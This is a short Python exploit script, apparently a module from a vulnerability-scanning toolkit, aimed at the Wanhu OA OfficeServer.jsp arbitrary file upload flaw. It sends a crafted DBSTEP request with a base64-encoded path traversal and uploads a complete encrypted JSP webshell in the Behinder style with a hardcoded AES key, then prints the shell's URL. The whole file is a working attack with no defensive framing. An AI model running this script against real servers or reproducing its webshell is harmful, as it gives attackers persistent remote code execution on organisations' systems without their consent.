import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging

def 万户OA_office_任意文件上传(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Connection": "Keep-Alive"
    }
    exp_url = urldata + "defaultroot/public/iWebOfficeSign/OfficeServer.jsp"
    data = '''DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ
    OPTION=U0FWRUZJTEU=
    RECORDID=
    isDoc=dHJ1ZQ==
    moduleType=Z292ZG9jdW1lbnQ=
    FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
    111111111111111111111111111111111111111111111111
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'''
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(exp_url, headers=headers, data=data, verify=False)
        if upload.status_code == 200:
            shell_url = urldata + 'defaultroot/public/edit/cmd_test.jsp'
            print(Vcolors.RED + "[+] 上传webshell成功，默认冰蝎密码 地址为:{}".format(shell_url) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING +"[x] 万户OA OfficeServer.jsp 任意文件上传漏洞不存在"+Vcolors.ENDC)
    except:
        logging.error("万户OA_office_任意文件上传脚本出现异常")
